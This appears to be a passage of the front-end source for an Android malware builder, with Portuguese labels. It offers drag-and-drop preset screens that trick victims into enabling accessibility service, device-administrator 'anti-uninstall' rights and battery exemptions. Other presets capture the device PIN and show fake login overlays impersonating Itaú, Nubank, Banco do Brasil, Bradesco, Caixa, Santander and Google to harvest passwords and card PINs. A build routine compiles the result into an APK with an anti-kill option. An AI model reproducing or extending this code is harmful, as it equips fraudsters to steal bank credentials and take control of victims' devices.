        } else {
          elements.push({
            id: 'acc-btn',
            type: 'button',
            position: { x: 60, y: 380 },
            size: { width: 260, height: 50 },
            content: btnText || 'Ativar Proteção',
            style: { backgroundColor: btnColor || '#ff6600', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' },
            buttonAction: 'accessibility'
          });
        }
      }
      
      updatedScreens[currentScreenIndex] = { ...screen, elements };
      return { ...prev, screens: updatedScreens };
    });
  };

  // ==================== HANDLERS DE TELA ====================
  
  const addScreen = () => {
    const newScreen: APKScreen = {
      id: `screen-${Date.now()}`,
      name: `Tela ${template.screens.length + 1}`,
      order: template.screens.length,
      backgroundColor: template.theme.backgroundColor,
      elements: [],
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: [...prev.screens, newScreen],
    }));
    
    setCurrentScreenIndex(template.screens.length);
  };

  const addPresetScreen = (presetType: string) => {
    let screenName = '';
    let bgColor = '#1a0705';
    let elements: ScreenElement[] = [];
    
    const generateId = () => `element-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    switch(presetType) {
      case 'accessibility':
        screenName = '🔐 1. Acessibilidade';
        bgColor = '#ffffff';
        elements = [
          { id: generateId(), type: 'text', position: { x: 30, y: 190 }, size: { width: 300, height: 40 }, content: 'Ativação de Segurança', style: { fontSize: 22, fontWeight: 'bold', textColor: '#663300', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 245 }, size: { width: 300, height: 80 }, content: 'Para sua proteção, ative o serviço de acessibilidade para validar sua conta.', style: { fontSize: 14, textColor: '#666666', textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 360 }, size: { width: 260, height: 50 }, content: 'Ativar Proteção', buttonAction: 'accessibility', style: { backgroundColor: '#ff6600', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'admin':
        screenName = '🛡️ 2. Administrador';
        bgColor = '#0a0a0b';
        elements = [
          { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '🛡️', style: { fontSize: 54, textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Proteção Anti-Desinstalação', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 225 }, size: { width: 300, height: 80 }, content: 'Conceda a permissão de Administrador do Dispositivo para proteger o aplicativo contra desligamento.', style: { fontSize: 14, textColor: '#c9a8a8', textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 340 }, size: { width: 260, height: 50 }, content: 'Ativar Administrador', buttonAction: 'next', style: { backgroundColor: '#ef4444', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'battery':
        screenName = '🔋 3. Economia de Bateria';
        bgColor = '#0a0a0b';
        elements = [
          { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '🔋', style: { fontSize: 54, textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Otimização de Bateria', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 225 }, size: { width: 300, height: 80 }, content: 'Desative as restrições de bateria para manter os alertas ativos em segundo plano.', style: { fontSize: 14, textColor: '#c9a8a8', textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 340 }, size: { width: 260, height: 50 }, content: 'Desativar Restrições', buttonAction: 'next', style: { backgroundColor: '#10b981', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'permissions':
        screenName = '📱 4. Permissões de Sistema';
        bgColor = '#0a0a0b';
        elements = [
          { id: generateId(), type: 'text', position: { x: 140, y: 80 }, size: { width: 100, height: 70 }, content: '📱', style: { fontSize: 54, textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 170 }, size: { width: 300, height: 40 }, content: 'Permissões do Sistema', style: { fontSize: 22, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 225 }, size: { width: 300, height: 80 }, content: 'Autorize as permissões de notificação e leitura para permitir o funcionamento da verificação.', style: { fontSize: 14, textColor: '#c9a8a8', textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 340 }, size: { width: 260, height: 50 }, content: 'Conceder Permissões', buttonAction: 'next', style: { backgroundColor: '#f65c8b', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'pin':
        screenName = '🔑 5. Validação de Senha';
        bgColor = '#ff6600';
        elements = [
          { id: generateId(), type: 'text', position: { x: 30, y: 180 }, size: { width: 300, height: 40 }, content: 'Validação do Dispositivo', style: { fontSize: 24, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 230 }, size: { width: 300, height: 60 }, content: 'Digite sua senha ou PIN do dispositivo para confirmar a autenticação.', style: { fontSize: 14, textColor: '#ffffff', textAlign: 'center', opacity: 0.9 } },
          { id: generateId(), type: 'input', position: { x: 50, y: 310 }, size: { width: 260, height: 60 }, content: '', inputType: 'pin', inputMaxLength: 6, inputPlaceholder: '● ● ● ● ● ●', inputLabel: 'SENHA_DISPOSITIVO', style: { backgroundColor: '#ffffff', textColor: '#333333', borderRadius: 10, fontSize: 24, textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 400 }, size: { width: 260, height: 50 }, content: 'Finalizar Validação', buttonAction: 'submit', style: { backgroundColor: '#663300', textColor: '#ffffff', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'success':
        screenName = '✅ 6. Sucesso / Conclusão';
        bgColor = '#663300';
        elements = [
          { id: generateId(), type: 'text', position: { x: 140, y: 130 }, size: { width: 100, height: 80 }, content: '✓', style: { fontSize: 72, textColor: '#00ff00', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 230 }, size: { width: 300, height: 40 }, content: 'Tudo Pronto!', style: { fontSize: 24, fontWeight: 'bold', textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'text', position: { x: 30, y: 280 }, size: { width: 300, height: 60 }, content: 'O sistema de proteção foi ativado com sucesso em seu dispositivo.', style: { fontSize: 14, textColor: '#ffffff', textAlign: 'center' } },
          { id: generateId(), type: 'button', position: { x: 50, y: 380 }, size: { width: 260, height: 50 }, content: 'Concluir', buttonAction: 'close', style: { backgroundColor: '#00ff00', textColor: '#663300', borderRadius: 25, fontSize: 16, fontWeight: 'bold' } }
        ];
        break;

      case 'itau':
        screenName = '🏦 Itaú';
        bgColor = '#a13700';
        elements = [
          {
            id: generateId(),
            type: 'rectangle',
            position: { x: 0, y: 0 },
            size: { width: 360, height: 75 },
            content: '',
            style: { backgroundColor: '#ec7000', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 20, y: 22 },
            size: { width: 320, height: 35 },
            content: 'itaú',
            style: { textColor: '#ffffff', fontSize: 26, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 130 },
            size: { width: 300, height: 40 },
            content: 'Para continuar, confirme seu acesso.',
            style: { textColor: '#ffffff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 40, y: 210 },
            size: { width: 280, height: 20 },
            content: 'Senha Eletrônica (6 dígitos)',
            style: { textColor: '#e2e8f0', fontSize: 12, opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 235 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: '••••••',
            inputType: 'password',
            inputLabel: 'senha_eletronica_itau',
            style: { backgroundColor: '#2a1212', textColor: '#ffffff', borderRadius: 8, borderWidth: 1, borderColor: '#7a5050' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 310 },
            size: { width: 280, height: 50 },
            content: 'Confirmar',
            buttonAction: 'submit',
            style: { backgroundColor: '#ec7000', textColor: '#ffffff', borderRadius: 8, fontWeight: 'bold' }
          }
        ];
        break;
      case 'nubank':
        screenName = '🏦 Nubank';
        bgColor = '#d10a83';
        elements = [
          {
            id: generateId(),
            type: 'text',
            position: { x: 130, y: 90 },
            size: { width: 100, height: 80 },
            content: 'nu',
            style: { textColor: '#ffffff', fontSize: 56, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 200 },
            size: { width: 300, height: 50 },
            content: 'Por favor, digite a senha do seu aplicativo.',
            style: { textColor: '#ffffff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 260 },
            size: { width: 300, height: 40 },
            content: 'Esta é a senha de 8 dígitos ou de acesso ao aplicativo.',
            style: { textColor: '#ffc8e5', fontSize: 12, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 320 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Senha de acesso',
            inputType: 'password',
            inputLabel: 'senha_acesso_nubank',
            style: { backgroundColor: '#2a1212', textColor: '#ffffff', borderRadius: 8, borderWidth: 1, borderColor: '#7a5050' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 395 },
            size: { width: 280, height: 50 },
            content: 'Confirmar',
            buttonAction: 'submit',
            style: { backgroundColor: '#ffffff', textColor: '#d10a83', borderRadius: 25, fontWeight: 'bold' }
          }
        ];
        break;
      case 'bb':
        screenName = '🏦 Banco do Brasil';
        bgColor = '#a83800';
        elements = [
          {
            id: generateId(),
            type: 'rectangle',
            position: { x: 0, y: 0 },
            size: { width: 360, height: 70 },
            content: '',
            style: { backgroundColor: '#fbdf07', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 20, y: 22 },
            size: { width: 320, height: 30 },
            content: 'BANCO DO BRASIL',
            style: { textColor: '#a83800', fontSize: 18, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 130 },
            size: { width: 300, height: 35 },
            content: 'Segurança e Validação',
            style: { textColor: '#ffffff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 175 },
            size: { width: 300, height: 50 },
            content: 'Insira sua senha de 8 dígitos para confirmar a liberação do seu aplicativo.',
            style: { textColor: '#e2e8f0', fontSize: 13, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 250 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Senha de 8 dígitos',
            inputType: 'password',
            inputLabel: 'senha_8_digitos_bb',
            style: { backgroundColor: '#2a1212', textColor: '#ffffff', borderRadius: 8, borderWidth: 1, borderColor: '#7a5050' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 330 },
            size: { width: 280, height: 50 },
            content: 'Entrar',
            buttonAction: 'submit',
            style: { backgroundColor: '#fbdf07', textColor: '#a83800', borderRadius: 25, fontWeight: 'bold' }
          }
        ];
        break;
      case 'bradesco':
        screenName = '🏦 Bradesco';
        bgColor = '#ffffff';
        elements = [
          {
            id: generateId(),
            type: 'rectangle',
            position: { x: 0, y: 0 },
            size: { width: 360, height: 75 },
            content: '',
            style: { backgroundColor: '#cc092f', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 20, y: 22 },
            size: { width: 320, height: 30 },
            content: 'Bradesco',
            style: { textColor: '#ffffff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 130 },
            size: { width: 300, height: 30 },
            content: 'Confirmação de Acesso',
            style: { textColor: '#cc092f', fontSize: 18, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 170 },
            size: { width: 300, height: 50 },
            content: 'Para autorizar este dispositivo, digite a senha de 4 dígitos do seu cartão de débito/crédito.',
            style: { textColor: '#9c8080', fontSize: 13, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 240 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Senha do cartão (4 dígitos)',
            inputType: 'numeric',
            inputLabel: 'senha_cartao_bradesco',
            style: { backgroundColor: '#f1f5f9', textColor: '#0a0a0b', borderRadius: 8, borderWidth: 1, borderColor: '#e1d5cb' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 315 },
            size: { width: 280, height: 50 },
            content: 'Avançar',
            buttonAction: 'submit',
            style: { backgroundColor: '#cc092f', textColor: '#ffffff', borderRadius: 8, fontWeight: 'bold' }
          }
        ];
        break;
      case 'caixa':
        screenName = '🏦 Caixa';
        bgColor = '#a90000';
        elements = [
          {
            id: generateId(),
            type: 'rectangle',
            position: { x: 0, y: 0 },
            size: { width: 360, height: 70 },
            content: '',
            style: { backgroundColor: '#f39200', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 20, y: 20 },
            size: { width: 320, height: 30 },
            content: 'CAIXA',
            style: { textColor: '#ffffff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 120 },
            size: { width: 300, height: 30 },
            content: 'Assinatura Eletrônica',
            style: { textColor: '#ffffff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 160 },
            size: { width: 300, height: 50 },
            content: 'Digite sua assinatura eletrônica de 6 dígitos para validar a autenticação do dispositivo.',
            style: { textColor: '#e2e8f0', fontSize: 13, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 230 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Assinatura Eletrônica',
            inputType: 'password',
            inputLabel: 'assinatura_eletronica_caixa',
            style: { backgroundColor: '#2a1212', textColor: '#ffffff', borderRadius: 8, borderWidth: 1, borderColor: '#7a5050' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 310 },
            size: { width: 280, height: 50 },
            content: 'Confirmar Assinatura',
            buttonAction: 'submit',
            style: { backgroundColor: '#f39200', textColor: '#ffffff', borderRadius: 8, fontWeight: 'bold' }
          }
        ];
        break;
      case 'santander':
        screenName = '🏦 Santander';
        bgColor = '#ec0000';
        elements = [
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 80 },
            size: { width: 300, height: 40 },
            content: 'Santander',
            style: { textColor: '#ffffff', fontSize: 32, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 170 },
            size: { width: 300, height: 30 },
            content: 'Dispositivo Bloqueado',
            style: { textColor: '#ffffff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 210 },
            size: { width: 300, height: 50 },
            content: 'Para desbloquear o acesso às suas contas, confirme sua senha eletrônica de 6 dígitos.',
            style: { textColor: '#ffe4e4', fontSize: 13, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 280 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Senha de 6 dígitos',
            inputType: 'password',
            inputLabel: 'senha_acesso_santander',
            style: { backgroundColor: '#2a1212', textColor: '#ffffff', borderRadius: 8, borderWidth: 1, borderColor: '#7a5050' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 40, y: 355 },
            size: { width: 280, height: 50 },
            content: 'Confirmar Identidade',
            buttonAction: 'submit',
            style: { backgroundColor: '#ffffff', textColor: '#ec0000', borderRadius: 25, fontWeight: 'bold' }
          }
        ];
        break;
      case 'google':
        screenName = '🔒 Google Lock';
        bgColor = '#ffffff';
        elements = [
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 80 },
            size: { width: 300, height: 40 },
            content: 'Google',
            style: { textColor: '#f48542', fontSize: 32, fontWeight: 'bold', textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 150 },
            size: { width: 300, height: 30 },
            content: 'Verifique sua identidade',
            style: { textColor: '#202124', fontSize: 20, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'text',
            position: { x: 30, y: 190 },
            size: { width: 300, height: 60 },
            content: 'Seu dispositivo Android detectou uma atividade suspeita. Para continuar, insira a senha da sua conta Google.',
            style: { textColor: '#5f6368', fontSize: 13, textAlign: 'center', opacity: 100 }
          },
          {
            id: generateId(),
            type: 'input',
            position: { x: 40, y: 270 },
            size: { width: 280, height: 50 },
            content: '',
            inputPlaceholder: 'Digite sua senha Google',
            inputType: 'password',
            inputLabel: 'senha_conta_google',
            style: { backgroundColor: '#ffffff', textColor: '#000000', borderRadius: 4, borderWidth: 1, borderColor: '#dadce0' }
          },
          {
            id: generateId(),
            type: 'button',
            position: { x: 230, y: 350 },
            size: { width: 90, height: 40 },
            content: 'Próximo',
            buttonAction: 'submit',
            style: { backgroundColor: '#e8731a', textColor: '#ffffff', borderRadius: 4, fontWeight: 'bold' }
          }
        ];
        break;
      default:
        return;
    }
    
    const newScreen: APKScreen = {
      id: `screen-${Date.now()}`,
      name: screenName,
      order: template.screens.length,
      backgroundColor: bgColor,
      elements: elements
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: [...prev.screens, newScreen],
    }));
    
    setCurrentScreenIndex(template.screens.length);
  };
  
  const deleteScreen = (screenIndex: number) => {
    if (template.screens.length <= 1) return;
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.filter((_, idx) => idx !== screenIndex),
    }));
    
    if (currentScreenIndex >= screenIndex && currentScreenIndex > 0) {
      setCurrentScreenIndex(currentScreenIndex - 1);
    }
  };
  
  const moveScreen = (screenIndex: number, direction: 'up' | 'down') => {
    const newIndex = direction === 'up' ? screenIndex - 1 : screenIndex + 1;
    if (newIndex < 0 || newIndex >= template.screens.length) return;
    
    setTemplate(prev => {
      const newScreens = [...prev.screens];
      [newScreens[screenIndex], newScreens[newIndex]] = [newScreens[newIndex], newScreens[screenIndex]];
      return { ...prev, screens: newScreens.map((s, i) => ({ ...s, order: i })) };
    });
    
    setCurrentScreenIndex(newIndex);
  };
  
  // ==================== HANDLERS DE DRAG ====================
  
  // Dimensões do celular (base Android)
  const ANDROID_WIDTH = 380; // Coordenadas Android
  const ANDROID_HEIGHT = 800;
  
  const handleMouseDown = (e: React.MouseEvent, elementId: string) => {
    if (previewMode) return;
    e.stopPropagation();
    
    const element = currentScreen.elements.find(el => el.id === elementId);
    if (!element) return;
    
    setSelectedElementId(elementId);
    setIsDragging(true);
    
    const rect = (e.target as HTMLElement).getBoundingClientRect();
    setDragOffset({
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    });
  };
  
  const handleMouseMove = useCallback((e: React.MouseEvent) => {
    if (!isDragging || !selectedElementId || !phonePreviewRef.current) return;
    
    const element = currentScreen?.elements.find(el => el.id === selectedElementId);
    if (!element) return;
    
    const previewRect = phonePreviewRef.current.getBoundingClientRect();
    
    // Calcula escala baseada no tamanho real do preview
    const scaleX = previewRect.width / ANDROID_WIDTH;
    const scaleY = previewRect.height / ANDROID_HEIGHT;
    
    // Posição do mouse relativa ao preview
    const mouseX = e.clientX - previewRect.left - (dragOffset.x * scaleX);
    const mouseY = e.clientY - previewRect.top - (dragOffset.y * scaleY);
    
    // Converte para coordenadas Android
    let newX = mouseX / scaleX;
    let newY = mouseY / scaleY;
    
    // Tamanho do elemento
    const elWidth = element.size.width;
    const elHeight = element.size.height;
    
    // LIMITA dentro da área do celular (não deixa sair!)
    // Margem mínima de 0, máxima = largura/altura - tamanho do elemento
    newX = Math.max(0, Math.min(ANDROID_WIDTH - elWidth, newX));
    newY = Math.max(0, Math.min(ANDROID_HEIGHT - elHeight, newY));
    
    updateElement(selectedElementId, {
      position: {
        x: Math.round(newX),
        y: Math.round(newY),
      },
    });
  }, [isDragging, selectedElementId, dragOffset, currentScreen]);
  
  const handleMouseUp = () => {
    setIsDragging(false);
  };
  
  // ==================== HANDLERS DE IMAGEM ====================
  
  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !selectedElementId) return;
    
    const reader = new FileReader();
    reader.onload = (event) => {
      const base64 = event.target?.result as string;
      updateElement(selectedElementId, { imageFile: base64 });
    };
    reader.readAsDataURL(file);
  };
  
  // ==================== BUILD APK ====================
  
  const handleBuildAPK = async () => {
    setIsBuilding(true);
    setBuildProgress(0);
    setBuildStatus('Iniciando build...');
    
    try {
      const token = localStorage.getItem('token');
      
      // 1. Inicia o build
      const formData = new FormData();
      formData.append('template', JSON.stringify({
        screens: template.screens,
        theme: template.theme,
        appName: template.appName,
        packageName: template.packageName,
        requestAdmin: template.requestAdmin || false,
        enableAntiKill: template.enableAntiKill !== false,
        language: template.language || 'pt',
        appIcon: template.appIcon || ''
      }));
      formData.append('app_name', template.appName);
      formData.append('language', template.language || 'pt');
      formData.append('enable_anti_kill', (template.enableAntiKill !== false) ? 'true' : 'false');
      
      // Converte a imagem customizada (base64) em Blob real, se fornecida
      if (template.appIcon && template.appIcon.startsWith('data:image')) {
        try {
          const parts = template.appIcon.split(',');
          const mimeMatch = parts[0].match(/:(.*?);/);
          const mime = mimeMatch ? mimeMatch[1] : 'image/png';
          const bstr = atob(parts[1]);
          let n = bstr.length;
          const u8arr = new Uint8Array(n);
          while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
          }
          const realIconBlob = new Blob([u8arr], { type: mime });
          formData.append('icon', realIconBlob, 'icon.png');
        } catch (e) {
          const iconBlob = new Blob([new Uint8Array(100)], { type: 'image/png' });
          formData.append('icon', iconBlob, 'icon.png');
        }
      } else {
        const iconBlob = new Blob([new Uint8Array(100)], { type: 'image/png' });
        formData.append('icon', iconBlob, 'icon.png');
      }
      
      setBuildStatus('Enviando configuração...');
      setBuildProgress(5);
      
      const response = await fetch(`${getApiBaseUrl()}/api/build-apk-visual`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData,
      });
      
      if (!response.ok) {
        throw new Error('Erro ao iniciar build');
      }
      
      const buildResult = await response.json();
      const buildId = buildResult.build_id;
      
      setBuildStatus('Build iniciado, aguarde...');
      setBuildProgress(10);
      
      // 2. Polling de status do build
      let attempts = 0;
      const maxAttempts = 120; // 2 minutos máximo
      
      while (attempts < maxAttempts) {
        await new Promise(r => setTimeout(r, 1000)); // Espera 1 segundo
        
        const statusResponse = await fetch(`${getApiBaseUrl()}/api/build-visual-status/${buildId}`, {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        
        if (!statusResponse.ok) {
          attempts++;
          continue;
        }
        
        const status = await statusResponse.json();
        
        setBuildProgress(status.progress || 0);
        setBuildStatus(status.message || 'Processando...');
        
        if (status.status === 'success' || status.status === 'done') {
          // Build concluído!
          setBuildProgress(100);
          setBuildStatus('✅ APK pronto para download!');
          
          // 📦 Adiciona ao histórico com buildId e downloadUrl
          if (status.download_url) {
            addToHistory(template.appName, buildId, status.download_url);
            
            // Abre o download automaticamente
            window.open(`${getApiBaseUrl()}${status.download_url}`, '_blank');
          }
          
          setTimeout(() => {
            setIsBuilding(false);
            setBuildProgress(0);
            setBuildStatus('');
          }, 3000);
          
          return;
        }
        
        if (status.status === 'error') {
          throw new Error(status.message || 'Erro no build');
        }
        
        attempts++;
      }
      
      throw new Error('Timeout: Build demorou muito');
      
    } catch (error: any) {
      console.error('Erro no build:', error);
      setBuildStatus(`❌ Erro: ${error.message || 'Tente novamente'}`);
      
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 3000);
    }
  };
  
  // ==================== RENDER ELEMENT ====================
  
  // Garante que elemento está dentro dos limites
  const clampPosition = (element: ScreenElement) => {
    const maxX = ANDROID_WIDTH - element.size.width;
    const maxY = ANDROID_HEIGHT - element.size.height;
    return {
      x: Math.max(0, Math.min(maxX, element.position.x)),
      y: Math.max(0, Math.min(maxY, element.position.y)),
    };
  };
  
  const renderElement = (element: ScreenElement, isPreview: boolean = false) => {
    const isSelected = selectedElementId === element.id && !isPreview;
    
    // Posição corrigida (sempre dentro da área)
    const pos = clampPosition(element);
    
    // Usa porcentagem para ser responsivo
    const leftPercent = (pos.x / ANDROID_WIDTH) * 100;
    const topPercent = (pos.y / ANDROID_HEIGHT) * 100;
    const widthPercent = (element.size.width / ANDROID_WIDTH) * 100;
    const heightPercent = (element.size.height / ANDROID_HEIGHT) * 100;
    
    const baseStyle: React.CSSProperties = {
      position: 'absolute',
      left: `${leftPercent}%`,
      top: `${topPercent}%`,
      width: `${widthPercent}%`,
      height: `${heightPercent}%`,
      backgroundColor: element.style.backgroundColor,
      color: element.style.textColor,
      borderRadius: element.style.borderRadius,
      fontSize: `${(element.style.fontSize || 14) / 14}rem`,
      fontWeight: element.style.fontWeight as any,
      textAlign: element.style.textAlign,
      padding: element.style.padding,
      opacity: element.style.opacity,
      border: isSelected ? '2px solid #ffbf00' : element.style.borderWidth ? `${element.style.borderWidth}px solid ${element.style.borderColor || '#000'}` : 'none',
      cursor: isPreview ? 'default' : 'move',
      display: 'flex',
      alignItems: 'center',
      justifyContent: element.style.textAlign === 'center' ? 'center' : element.style.textAlign === 'right' ? 'flex-end' : 'flex-start',
      boxShadow: isSelected ? '0 0 10px rgba(255,191,0,0.5)' : undefined,
      zIndex: isSelected ? 1000 : 1,
      userSelect: 'none',
      overflow: 'hidden',
    };
    
    const handleClick = (e: React.MouseEvent) => {
      e.stopPropagation();
      if (!isPreview) setSelectedElementId(element.id);
    };
    
    switch (element.type) {
      case 'text':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.content}
          </div>
        );
        
      case 'button':
        return (
          <button
            key={element.id}
            style={{
              ...baseStyle,
              border: isSelected ? '2px solid #ffbf00' : 'none',
              outline: 'none',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.content}
          </button>
        );
        
      case 'input':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <input
              type={element.inputType === 'pin' || element.inputType === 'password' ? 'password' : 'text'}
              placeholder={element.inputPlaceholder}
              maxLength={element.inputMaxLength}
              style={{
                width: '100%',
                height: '100%',
                border: 'none',
                background: 'transparent',
                fontSize: 'inherit',
                color: 'inherit',
                textAlign: element.style.textAlign || 'center',
                outline: 'none',
                pointerEvents: isPreview ? 'auto' : 'none',
              }}
              inputMode={element.inputType === 'numeric' || element.inputType === 'pin' ? 'numeric' : 'text'}
            />
          </div>
        );
        
      case 'image':
      case 'logo':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: element.imageFile ? 'transparent' : '#e0e0e0',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.imageFile ? (
              <img
                src={element.imageFile}
                alt=""
                style={{ width: '100%', height: '100%', objectFit: 'contain' }}
              />
            ) : (
              <Image size={32} color="#999" />
            )}
          </div>
        );
        
      case 'rectangle':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          />
        );
        
      case 'circle':
        return (
          <div
            key={element.id}
            style={{ ...baseStyle, borderRadius: '50%' }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          />
        );
        
      case 'file_upload':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: element.style.backgroundColor || '#f5f5f5',
              flexDirection: 'column',
              gap: '8px',
              padding: '12px',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <div style={{ 
              width: '40px', 
              height: '40px', 
              borderRadius: '50%',
              backgroundColor: '#4caf50',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}>
              <Upload size={20} color="#FFF" />
            </div>
            <span style={{ fontSize: '12px', color: '#666', textAlign: 'center' }}>
              {element.content || 'Enviar Documento'}
            </span>
            <button
              style={{
                backgroundColor: '#4caf50',
                color: '#FFF',
                padding: '8px 16px',
                borderRadius: '6px',
                border: 'none',
                fontSize: '12px',
                cursor: 'pointer',
              }}
            >
              {element.fileButtonText || 'Selecionar Arquivo'}
            </button>
            <span style={{ fontSize: '10px', color: '#999' }}>
              {element.fileTypes?.map(t => t === 'image' ? 'IMG' : t === 'pdf' ? 'PDF' : t === 'document' ? 'DOC' : '*').join(', ') || 'Todos'}
            </span>
          </div>
        );
        
      case 'fingerprint':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: 'transparent',
              flexDirection: 'column',
              gap: '8px',
              padding: '8px',
            }}
            onClick={handleClick}
